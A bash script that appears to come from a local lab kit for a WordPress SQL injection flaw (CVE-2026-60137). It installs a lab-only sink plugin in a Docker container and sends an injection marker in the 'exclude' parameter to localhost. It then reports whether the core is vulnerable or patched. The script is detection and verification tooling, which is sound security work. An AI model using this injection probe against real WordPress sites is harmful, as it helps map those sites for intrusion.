#!/usr/bin/env bash
# wp2shell SQLi sink probe (CVE-2026-60137) - SAFE.
# Deploys the lab-only sink plugin, then sends two requests: a benign integer and
# a bare-word marker. On vulnerable core the marker reaches SQL and raises an
# "Unknown column" error; on patched core it is coerced to an integer and no error
# occurs. It extracts NO data, dumps no rows, and runs only ordinary SELECTs.
set -euo pipefail

WP_PORT="${WP_PORT:-8028}"
BASE="http://localhost:${WP_PORT}"
HERE="$(cd "$(dirname "$0")" && pwd)"

echo "== Deploying the lab-only author__not_in sink =="
docker compose exec -T wp mkdir -p /var/www/html/wp-content/mu-plugins
docker cp "${HERE}/lab-author-sink.php" "$(docker compose ps -q wp):/var/www/html/wp-content/mu-plugins/lab-author-sink.php"
echo "deployed."
echo

echo "== 1. Benign value: exclude=1 =="
curl -s "${BASE}/?wp2shell_sink=1&exclude=1" | sed 's/^/  /'
echo

echo "== 2. Injection marker: exclude=wp2shell_marker) =="
echo "   (a bare word that is only valid SQL if it lands in the query unquoted)"
curl -s --get "${BASE}/" \
  --data-urlencode "wp2shell_sink=1" \
  --data-urlencode "exclude=wp2shell_marker)" | sed 's/^/  /'
echo

RESULT=$(curl -s --get "${BASE}/" --data-urlencode "wp2shell_sink=1" --data-urlencode "exclude=wp2shell_marker)")
if echo "$RESULT" | grep -q "db_error"; then
  echo "RESULT: VULNERABLE. The marker reached the SQL WHERE clause verbatim and"
  echo "        broke the query's syntax, so the database raised an error. Unsanitized"
  echo "        request input is being concatenated straight into SQL."
  echo "        Apply the fix and re-run:  ./apply-fix.sh && ./sqli/probe-sqli.sh"
else
  echo "RESULT: PATCHED. The marker was coerced to an integer by wp_parse_id_list(),"
  echo "        so no SQL error occurred. This is the 6.8.6 / 6.9.5 / 7.0.2 behaviour."
  echo "        Restore vulnerable core and re-run:  ./restore-vuln.sh && ./sqli/probe-sqli.sh"
fi
